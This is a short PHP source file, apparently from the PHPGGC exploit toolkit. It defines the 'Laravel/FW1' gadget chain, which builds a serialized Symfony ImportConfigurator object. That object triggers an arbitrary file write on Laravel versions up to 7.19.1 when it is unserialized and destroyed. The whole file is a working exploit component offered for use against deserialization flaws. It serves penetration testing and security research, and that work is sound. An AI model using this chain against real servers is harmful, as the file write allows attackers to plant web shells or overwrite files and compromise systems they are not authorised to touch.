<?php

namespace GadgetChain\Laravel;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '<=7.19.1';
    public static $vector = '__destruct';
    public static $author = 'AFKL';

    public function generate(array $parameters)
    {
		$path = $parameters['remote_path'];
    	$data = $parameters['data'];
		return new \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($path, $data);
    }
}